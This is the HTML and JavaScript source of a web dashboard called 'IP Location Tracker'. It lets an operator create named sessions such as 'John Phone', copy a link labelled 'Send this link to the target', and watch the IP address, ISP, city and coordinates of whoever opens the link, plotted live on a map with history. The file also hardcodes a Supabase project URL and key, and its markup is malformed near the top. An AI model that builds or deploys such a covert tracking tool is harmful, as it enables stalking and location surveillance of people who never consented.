<script>

const SUPABASE_URL = 'https://qjoyjmjtkcblwfpggzwq.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFqb3lqbWp0a2NibHdmcGdnendxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQyMzM0MTMsImV4cCI6MjA4OTgwOTQxM30.C_5BGwZzvs5gLBdz7H-vvDhsHUV83oy2ypSG3jBK6oI';

<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
:root{--bg1:#0f0f1a;--bg2:#1a1a2e;--bg3:#16213e;--acc:#00d4ff;--red:#ff4757;--grn:#2ed573;--t1:#e8e8e8;--t2:#8a8a9a;--t3:#555566;--brd:#2a2a3e}
body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg1);color:var(--t1);height:100vh;overflow:hidden}
.app{display:grid;grid-template-columns:340px 1fr;grid-template-rows:54px 1fr;height:100vh}
.hdr{grid-column:1/-1;background:var(--bg2);border-bottom:1px solid var(--brd);display:flex;align-items:center;justify-content:space-between;padding:0 20px}
.hdr h1{font-size:1.1rem;display:flex;align-items:center;gap:8px}
.badge{background:rgba(0,212,255,.12);color:var(--acc);padding:3px 10px;border-radius:20px;font-size:.7rem;font-weight:600}
.side{background:var(--bg2);border-right:1px solid var(--brd);display:flex;flex-direction:column;overflow:hidden}
.sec{padding:14px;border-bottom:1px solid var(--brd)}
.sec h3{font-size:.7rem;text-transform:uppercase;letter-spacing:1px;color:var(--t3);margin-bottom:10px}
.frm{display:flex;gap:6px}
.frm input{flex:1;padding:9px 12px;background:var(--bg1);border:1px solid var(--brd);border-radius:8px;color:var(--t1);font-size:.88rem;outline:none}
.frm input:focus{border-color:var(--acc)}
.frm input::placeholder{color:var(--t3)}
.btn{padding:9px 14px;border:none;border-radius:8px;font-size:.82rem;font-weight:600;cursor:pointer;transition:.2s}
.btn-p{background:var(--acc);color:#000}
.btn-p:hover{opacity:.85}
.btn-d{background:transparent;color:var(--red);border:1px solid #c0392b;padding:5px 10px;font-size:.75rem}
.btn-d:hover{background:var(--red);color:#fff}
.btn-g{background:transparent;color:var(--t2);border:1px solid var(--brd);padding:5px 10px;font-size:.75rem}
.btn-g:hover{border-color:var(--acc);color:var(--acc)}
.slist{flex:1;overflow-y:auto;padding:6px}
.slist::-webkit-scrollbar{width:3px}
.scard{background:var(--bg3);border:1px solid var(--brd);border-radius:8px;padding:12px;margin-bottom:6px;cursor:pointer;transition:.2s}
.scard:hover{border-color:var(--acc)}
.scard.active{border-color:var(--acc);box-shadow:inset 0 0 20px rgba(0,212,255,.1)}
.scard .nm{font-weight:600;font-size:.9rem;margin-bottom:4px;display:flex;align-items:center;gap:7px}
.dot{width:7px;height:7px;border-radius:50%;display:inline-block}
.dot.on{background:var(--grn);box-shadow:0 0 5px var(--grn)}
.dot.off{background:var(--t3)}
.scard .mt{font-size:.72rem;color:var(--t2);display:flex;gap:10px}
.mapc{position:relative}
#map{width:100%;height:100%}
.panel{position:absolute;top:0;right:0;width:400px;height:100%;background:var(--bg2);border-left:1px solid var(--brd);z-index:500;display:none;flex-direction:column;box-shadow:-4px 0 20px rgba(0,0,0,.4)}
.panel.vis{display:flex}
.phdr{padding:14px 18px;border-bottom:1px solid var(--brd);display:flex;justify-content:space-between;align-items:center}
.phdr h3{font-size:.95rem;display:flex;align-items:center;gap:8px}
.cbtn{background:none;border:none;color:var(--t2);font-size:1.2rem;cursor:pointer;padding:4px}
.cbtn:hover{color:var(--t1)}
.urlbox{margin:14px 18px;padding:12px;background:var(--bg1);border:1px solid var(--brd);border-radius:8px}
.urlbox label{font-size:.68rem;text-transform:uppercase;letter-spacing:1px;color:var(--t3);display:block;margin-bottom:6px}
.urlbox .ur{display:flex;gap:5px}
.urlbox input{flex:1;padding:7px 9px;background:var(--bg2);border:1px solid var(--brd);border-radius:6px;color:var(--acc);font-family:monospace;font-size:.75rem;outline:none}
.pacts{padding:0 18px 10px;display:flex;gap:6px}
.lhist{flex:1;overflow-y:auto;padding:0 18px 18px}
.lhist h4{font-size:.72rem;text-transform:uppercase;letter-spacing:1px;color:var(--t3);margin:12px 0 8px}
.lentry{background:var(--bg3);border:1px solid var(--brd);border-radius:8px;padding:10px;margin-bottom:6px;font-size:.82rem}
.lentry .co{font-family:monospace;color:var(--acc);font-size:.78rem;margin-bottom:3px}
.lentry .dt{color:var(--t2);font-size:.75rem;line-height:1.5}
.lentry .dt code{background:var(--bg1);padding:1px 4px;border-radius:3px;font-size:.72rem}
.lentry .tm{color:var(--t3);font-size:.7rem;margin-top:4px}
.empty{text-align:center;padding:30px 16px;color:var(--t3)}
.empty .ic{font-size:2rem;margin-bottom:10px}
.empty p{font-size:.82rem;line-height:1.5}
.live{display:inline-flex;align-items:center;gap:4px;background:rgba(46,213,115,.1);color:var(--grn);padding:2px 8px;border-radius:20px;font-size:.68rem;font-weight:600}
.live .p{width:5px;height:5px;background:var(--grn);border-radius:50%;animation:pu 1.5s infinite}
@keyframes pu{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(1.8)}}
.tbox{position:fixed;top:62px;right:16px;z-index:9999;display:flex;flex-direction:column;gap:6px}
.tst{background:var(--bg3);border:1px solid var(--brd);border-radius:8px;padding:10px 16px;font-size:.82rem;box-shadow:0 8px 32px rgba(0,0,0,.3);animation:si .3s ease;min-width:250px}
.tst.success{border-left:3px solid var(--grn)}
.tst.error{border-left:3px solid var(--red)}
.tst.info{border-left:3px solid var(--acc)}
@keyframes si{from{transform:translateX(100px);opacity:0}to{transform:translateX(0);opacity:1}}
.leaflet-container{background:var(--bg1)!important}
.custom-marker{position:relative}
.mp{background:var(--acc);border-radius:50%;border:3px solid #fff;box-shadow:0 0 10px var(--acc)}
.mp.latest{animation:mpulse 2s infinite}
@keyframes mpulse{0%{box-shadow:0 0 0 0 rgba(0,212,255,.6)}70%{box-shadow:0 0 0 16px rgba(0,212,255,0)}100%{box-shadow:0 0 0 0 rgba(0,212,255,0)}}
.leaflet-popup-content-wrapper{background:var(--bg3)!important;color:var(--t1)!important;border:1px solid var(--brd)!important;border-radius:8px!important}
.leaflet-popup-tip{background:var(--bg3)!important}
#errBox{position:fixed;bottom:0;left:0;right:0;background:#2d1320;border-top:2px solid var(--red);padding:12px 20px;font-family:monospace;font-size:.8rem;color:var(--red);z-index:99999;display:none;max-height:180px;overflow-y:auto}
@media(max-width:800px){.app{grid-template-columns:1fr;grid-template-rows:54px 50vh 1fr}.side{order:3;border-right:none;border-top:1px solid var(--brd)}.panel{width:100%}}
</style>
</head>
<body>
<div class="app">
  <header class="hdr">
    <h1>📡 IP Location Tracker</h1>
    <span class="badge" id="stBadge">STARTING...</span>
  </header>
  <aside class="side">
    <div class="sec">
      <h3>➕ New Session</h3>
      <form class="frm" id="cForm">
        <input type="text" id="sName" placeholder='e.g. "John Phone"' maxlength="50" required>
        <button type="submit" class="btn btn-p" id="cBtn">Track</button>
      </form>
      <div id="cErr" style="color:#ff4757;font-size:.75rem;margin-top:6px;display:none"></div>
    </div>
    <div class="sec" style="padding-bottom:6px"><h3>📋 Sessions</h3></div>
    <div class="slist" id="sList">
      <div class="empty"><div class="ic">📭</div><p>No sessions yet.<br>Create one to start.</p></div>
    </div>
  </aside>
  <main class="mapc">
    <div id="map"></div>
    <div class="panel" id="pnl">
      <div class="phdr">
        <h3 id="pTitle">Details</h3>
        <button class="cbtn" id="pClose">✕</button>
      </div>
      <div class="urlbox">
        <label>🔗 Send this link to the target</label>
        <div class="ur">
          <input type="text" id="tUrl" readonly>
          <button type="button" class="btn btn-g" id="cpBtn">📋</button>
        </div>
      </div>
      <div class="pacts">
        <button type="button" class="btn btn-g" id="tgBtn">⏸ Pause</button>
        <button type="button" class="btn btn-d" id="dlBtn">🗑 Delete</button>
      </div>
      <div class="lhist" id="lHist">
        <h4>📍 Location History</h4>
        <div class="empty"><p>Waiting for target…</p></div>
      </div>
    </div>
  </main>
</div>
<div class="tbox" id="tBox"></div>
<div id="errBox"></div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<script>
// ═══════════════════════════════════════════════════
// ALL CODE INLINE — NO EXTERNAL FILES TO FAIL
// ═══════════════════════════════════════════════════

const LOG = [];
function log(m) { LOG.push(m); console.log(m); }
function logErr(m) {
  LOG.push('❌ ' + m);
  console.error(m);
  const b = document.getElementById('errBox');
  b.style.display = 'block';
  b.innerHTML += '<div>' + m + '</div>';
}

function setBadge(text, color) {
  const b = document.getElementById('stBadge');
  b.textContent = text;
  if (color) b.style.color = color;
}

function toast(m, t) {
  log('[' + t + '] ' + m);
  const e = document.createElement('div');
  e.className = 'tst ' + t;
  e.textContent = m;
  document.getElementById('tBox').appendChild(e);
  setTimeout(() => e.remove(), 5000);
}

function esc(s) { if (!s) return ''; const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
function ago(d) { if (!d) return 'Never'; const s = (Date.now() - new Date(d).getTime()) / 1000; if (s < 0) return 'Now'; if (s < 60) return Math.floor(s) + 's'; if (s < 3600) return Math.floor(s/60) + 'm'; if (s < 86400) return Math.floor(s/3600) + 'h'; return Math.floor(s/86400) + 'd'; }
function rid(n) { const c = 'abcdefghijklmnopqrstuvwxyz0123456789'; const a = new Uint8Array(n||12); crypto.getRandomValues(a); return Array.from(a, b => c[b%c.length]).join(''); }

let db, map, actId = null, rtCh = null;
const mgs = new Map();

// ═══════════════════════════════════════════════════
// MAIN
// ═══════════════════════════════════════════════════
async function main() {
  log('🚀 Starting...');

  // 1. Check config
  if (SUPABASE_URL.includes('REPLACE')) {
    logErr('You must edit index.html and replace SUPABASE_URL and SUPABASE_ANON_KEY with your real values from Supabase → Settings → API');
    setBadge('NOT CONFIGURED', '#ff4757');
    return;
  }
  log('Config: ' + SUPABASE_URL);

  // 2. Check library
  if (typeof supabase === 'undefined') {
    logErr('Supabase JS library failed to load from CDN. Check your internet connection.');
    setBadge('LOAD ERROR', '#ff4757');
    return;
  }
  log('✅ Supabase lib loaded');

  // 3. Create client
  try {
    db = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
    log('✅ Client created');
  } catch (e) {
    logErr('Client creation failed: ' + e.message);
    setBadge('CLIENT ERROR', '#ff4757');
    return;
  }

  // 4. Init map
  try {
    map = L.map('map', { center: [20, 0], zoom: 2, attributionControl: false });
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { maxZoom: 19 }).addTo(map);
    log('✅ Map ready');
  } catch (e) {
    logErr('Map error: ' + e.message);
  }

  // 5. Test DB with timeout
  setBadge('TESTING DB...', '#ffa502');
  log('🔌 Testing database...');

  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 10000);

    const { data, error } = await db
      .from('sessions')
      .select('id')
      .limit(1)
      .abortSignal(controller.signal);

    clearTimeout(timeout);

    if (error) {
      logErr('DB Error: ' + error.message);
      logErr('Code: ' + (error.code || '?') + ' | Hint: ' + (error.hint || '?'));

      if (error.message.includes('does not exist')) {
        logErr('FIX: Run the SQL in Supabase → SQL Editor to create the tables.');
      } else if (error.message.includes('policy') || error.code === '42501') {
        logErr('FIX: RLS policies missing. Run the full SQL in Supabase → SQL Editor.');
      } else if (error.message.includes('Invalid API key') || error.message.includes('apikey')) {
        logErr('FIX: Wrong SUPABASE_ANON_KEY. Copy the correct one from Supabase → Settings → API.');
      }

      setBadge('DB ERROR', '#ff4757');
      // Don't return — still let them try to use the UI
    } else {
      log('✅ Database connected OK! Found ' + (data?.length || 0) + ' sessions');
      setBadge('LIVE ✓', '#2ed573');
    }
  } catch (e) {
    if (e.name === 'AbortError') {
      logErr('Database connection TIMED OUT after 10 seconds.');
      logErr('Possible causes: 1) Supabase project is PAUSED (go restore it) 2) Wrong SUPABASE_URL 3) Network blocked');
    } else {
      logErr('Network error: ' + e.message);
      logErr('Check: Is your SUPABASE_URL correct? Is your internet working?');
    }
    setBadge('TIMEOUT', '#ff4757');
  }

  // 6. Load sessions
  await loadSessions();

  // 7. Wire up UI
  document.getElementById('cForm').onsubmit = async (e) => {
    e.preventDefault();
    const inp = document.getElementById('sName');
    const errEl = document.getElementById('cErr');
    const name = inp.value.trim();
    if (!name) return;

    errEl.style.display = 'none';
    const btn = document.getElementById('cBtn');
    btn.disabled = true; btn.textContent = '...';

    try {
      const id = rid();
      log('Creating: ' + name + ' (' + id + ')');

      const { data, error } = await db.from('sessions').insert({ id, name }).select();

      if (error) {
        logErr('Create failed: ' + error.message + ' | Code: ' + (error.code || '?'));
        errEl.textContent = error.message;
        errEl.style.display = 'block';
        toast('❌ ' + error.message, 'error');
      } else {
        log('✅ Created: ' + JSON.stringify(data));
        toast('✅ "' + name + '" created!', 'success');
        inp.value = '';
        await loadSessions();
        await selSession(id);
      }
    } catch (err) {
      logErr('Create crash: ' + err.message);
      errEl.textContent = err.message;
      errEl.style.display = 'block';
    }

    btn.disabled = false; btn.textContent = 'Track';
  };

  document.getElementById('pClose').onclick = () => {
    document.getElementById('pnl').classList.remove('vis');
    actId = null;
    if (rtCh) { db.removeChannel(rtCh); rtCh = null; }
    document.querySelectorAll('.scard').forEach(c => c.classList.remove('active'));
  };

  document.getElementById('cpBtn').onclick = () => {
    const i = document.getElementById('tUrl');
    navigator.clipboard.writeText(i.value)
      .then(() => toast('📋 Copied!', 'success'))
      .catch(() => { i.select(); document.execCommand('copy'); toast('📋 Copied!', 'success'); });
  };

  document.getElementById('tgBtn').onclick = togSession;
  document.getElementById('dlBtn').onclick = delSession;

  setInterval(loadSessions, 30000);
  log('✅ Dashboard ready');
}

// ═══════════════════════════════════════════════════
async function loadSessions() {
  try {
    const { data, error } = await db.from('sessions').select('*').order('created_at', { ascending: false });
    if (error) { logErr('Load: ' + error.message); return; }

    const enriched = [];
    for (const s of data) {
      const { count } = await db.from('locations').select('*', { count: 'exact', head: true }).eq('session_id', s.id);
      const { data: lt } = await db.from('locations').select('created_at').eq('session_id', s.id).order('created_at', { ascending: false }).limit(1);
      enriched.push({ ...s, pc: count || 0, ls: lt?.[0]?.created_at || null });
    }
    renderSessions(enriched);
  } catch (e) { logErr('loadSessions: ' + e.message); }
}

function renderSessions(ss) {
  const el = document.getElementById('sList');
  if (!ss.length) {
    el.innerHTML = '<div class="empty"><div class="ic">📭</div><p>No sessions yet.<br>Create one to start.</p></div>';
    return;
  }
  el.innerHTML = ss.map(s => `
    <div class="scard ${s.id===actId?'active':''}" data-id="${s.id}" onclick="selSession('${s.id}')">
      <div class="nm"><span class="dot ${s.is_active?'on':'off'}"></span>${esc(s.name)}</div>
      <div class="mt"><span>🏓 ${s.pc}</span><span>👁 ${ago(s.ls)}</span></div>
    </div>
  `).join('');
}

async function selSession(id) {
  actId = id;
  if (rtCh) { db.removeChannel(rtCh); rtCh = null; }

  try {
    const { data: s } = await db.from('sessions').select('*').eq('id', id).single();
    if (!s) { toast('Not found', 'error'); return; }

    const { data: locs } = await db.from('locations').select('*').eq('session_id', id).order('created_at', { ascending: false }).limit(200);

    document.getElementById('pnl').classList.add('vis');
    document.getElementById('pTitle').innerHTML = esc(s.name) + (s.is_active ? ' <span class="live"><span class="p"></span>LIVE</span>' : ' <span class="badge" style="background:#555;color:#000">OFF</span>');

    const base = window.location.href.replace(/\/[^/]*$/, '');
    document.getElementById('tUrl').value = base + '/track.html?s=' + id;
    document.getElementById('tgBtn').textContent = s.is_active ? '⏸ Pause' : '▶ Resume';

    renderLocs(locs || []);
    updateMap(id, locs || []);

    document.querySelectorAll('.scard').forEach(c => c.classList.toggle('active', c.dataset.id === id));

    rtCh = db.channel('rt-' + id + '-' + Date.now())
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'locations', filter: 'session_id=eq.' + id },
        () => { toast('📍 New ping!', 'success'); selSession(id); })
      .subscribe();
  } catch (e) { logErr('selSession: ' + e.message); }
}

function renderLocs(locs) {
  const el = document.getElementById('lHist');
  if (!locs.length) {
    el.innerHTML = '<h4>📍 Location History</h4><div class="empty"><p>Waiting for target…</p></div>';
    return;
  }
  el.innerHTML = '<h4>📍 History (' + locs.length + ')</h4>' + locs.map((l, i) => `
    <div class="lentry">
      <div class="co">${l.latitude?.toFixed(6)??'?'}, ${l.longitude?.toFixed(6)??'?'} ${i===0?'<span class="live" style="margin-left:6px"><span class="p"></span>Latest</span>':''}</div>
      <div class="dt">📍 ${esc(l.city)}, ${esc(l.region)}, ${esc(l.country)}<br>🌐 <code>${esc(l.ip)}</code><br>🏢 ${esc(l.isp)}<br>🎯 ${esc(l.accuracy)}</div>
      <div class="tm">${new Date(l.created_at).toLocaleString()}</div>
    </div>
  `).join('');
}

function updateMap(sid, locs) {
  if (mgs.has(sid)) map.removeLayer(mgs.get(sid));
  const v = (locs||[]).filter(l => l.latitude && l.longitude);
  if (!v.length) return;
  const g = L.layerGroup();
  if (v.length > 1) L.polyline(v.map(l=>[l.latitude,l.longitude]),{color:'#00d4ff',weight:2,opacity:.5,dashArray:'5,10'}).addTo(g);
  v.forEach((l,i) => {
    const lt = i===0;
    const ic = L.divIcon({className:'custom-marker',html:'<div class="mp '+(lt?'latest':'')+'" style="opacity:'+(lt?1:.4)+';width:'+(lt?20:9)+'px;height:'+(lt?20:9)+'px"></div>',iconSize:[20,20],iconAnchor:[10,10]});
    L.marker([l.latitude,l.longitude],{icon:ic}).bindPopup('<div style="font-size:12px;line-height:1.5"><b>'+esc(l.city)+', '+esc(l.country)+'</b><br>IP: '+esc(l.ip)+'<br>'+esc(l.isp)+'<br>'+new Date(l.created_at).toLocaleString()+'</div>').addTo(g);
  });
  g.addTo(map); mgs.set(sid, g);
  map.flyTo([v[0].latitude, v[0].longitude], 13, {duration:1.5});
}

async function togSession() {
  if (!actId) return;
  const { data: s } = await db.from('sessions').select('is_active').eq('id', actId).single();
  await db.from('sessions').update({ is_active: !s.is_active }).eq('id', actId);
  toast(s.is_active ? '⏸ Paused' : '▶ Resumed', 'info');
  await loadSessions(); selSession(actId);
}

async function delSession() {
  if (!actId || !confirm('Delete this session?')) return;
  const id = actId;
  if (rtCh) { db.removeChannel(rtCh); rtCh = null; }
  if (mgs.has(id)) { map.removeLayer(mgs.get(id)); mgs.delete(id); }
  await db.from('locations').delete().eq('session_id', id);
  await db.from('sessions').delete().eq('id', id);
  actId = null;
  document.getElementById('pnl').classList.remove('vis');
  toast('🗑 Deleted', 'error');
  await loadSessions();
}

// RUN
main().catch(e => {
  logErr('FATAL: ' + e.message);
  setBadge('CRASHED', '#ff4757');
});
</script>
</body>
</html>
